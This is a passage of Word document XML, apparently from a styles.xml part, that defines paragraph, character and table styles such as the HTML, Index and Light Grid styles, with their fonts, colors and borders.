    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="00769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E5272" w:themeFill="text1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="18" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="003A4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577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5771" w:themeFill="accent6" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="005771" w:themeFill="accent6" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="005771" w:themeFill="accent6" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="DocumentMap">
    <w:name w:val="Document Map"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="DocumentMapChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F3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41CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="E-mailSignature">
    <w:name w:val="E-mail Signature"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="E-mailSignatureChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="E-mailSignatureChar">
    <w:name w:val="E-mail Signature Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="E-mailSignature"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Emphasis">
    <w:name w:val="Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="20"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="EndnoteReference">
    <w:name w:val="endnote reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:vertAlign w:val="superscript"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="EndnoteText">
    <w:name w:val="endnote text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="EndnoteTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="EndnoteTextChar">
    <w:name w:val="Endnote Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="EndnoteText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="EnvelopeAddress">
    <w:name w:val="envelope address"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>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6E0F31"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="HTMLAcronym">
    <w:name w:val="HTML Acronym"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTMLAddress">
    <w:name w:val="HTML Address"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HTMLAddressChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="HTMLAddressChar">
    <w:name w:val="HTML Address Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="HTMLAddress"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:i/>
      <w:iCs/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="HTMLCite">
    <w:name w:val="HTML Cite"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="HTMLCode">
    <w:name w:val="HTML Code"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="HTMLDefinition">
    <w:name w:val="HTML Definition"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="HTMLKeyboard">
    <w:name w:val="HTML Keyboard"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTMLPreformatted">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HTMLPreformattedChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>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B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="HTMLSample">
    <w:name w:val="HTML Sample"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="HTMLTypewriter">
    <w:name w:val="HTML Typewriter"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="HTMLVariable">
    <w:name w:val="HTML Variable"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Index1">
    <w:name w:val="index 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
      <w:ind w:left="200" w:hanging="200"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Index2">
    <w:name w:val="index 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
      <w:ind w:left="400" w:hanging="200"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Index3">
    <w:name w:val="index 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
      <w:ind w:left="600" w:hanging="200"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Index4">
    <w:name w:val="index 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
      <w:ind w:left="800" w:hanging="200"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Index5">
    <w:name w:val="index 5"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
      <w:ind w:left="1000" w:hanging="200"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Index6">
    <w:name w:val="index 6"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
      <w:ind w:left="1200" w:hanging="200"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Index7">
    <w:name w:val="index 7"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
      <w:ind w:left="1400" w:hanging="200"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Index8">
    <w:name w:val="index 8"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
      <w:ind w:left="1600" w:hanging="200"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Index9">
    <w:name w:val="index 9"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
      <w:ind w:left="1800" w:hanging="200"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="IndexHeading">
    <w:name w:val="index heading"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Index1"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="IntenseEmphasis">
    <w:name w:val="Intense Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="21"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="68727B" w:themeColor="accent1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="LightGrid">
    <w:name w:val="Light Grid"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="62"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="1E5272"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E5272" w:themeColor="text1"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:bottom w:val="single" w:sz="18" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="1E527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E5272" w:themeColor="text1"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="1E527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E5272" w:themeColor="text1"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="B7D7EC" w:themeFill="text1" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="B7D7EC" w:themeFill="text1" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band2Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightGrid-Accent1">
    <w:name w:val="Light Grid Accent 1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="62"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="68727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727B" w:themeColor="accent1"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:bottom w:val="single" w:sz="18" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="68727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727B" w:themeColor="accent1"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="68727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727B" w:themeColor="accent1"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="D9DCDF" w:themeFill="accent1" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="D9DCDF" w:themeFill="accent1" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band2Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightGrid-Accent2">
    <w:name w:val="Light Grid Accent 2"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="62"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="D94D2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4D22" w:themeColor="accent2"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:bottom w:val="single" w:sz="18" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="D94D2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4D22" w:themeColor="accent2"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="D94D2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4D22" w:themeColor="accent2"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="F6D2C7" w:themeFill="accent2" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="F6D2C7" w:themeFill="accent2" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band2Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightGrid-Accent3">
    <w:name w:val="Light Grid Accent 3"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="62"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="A7A8B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7A8B0" w:themeColor="accent3"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:bottom w:val="single" w:sz="18" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="A7A8B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7A8B0" w:themeColor="accent3"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="A7A8B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7A8B0" w:themeColor="accent3"/>
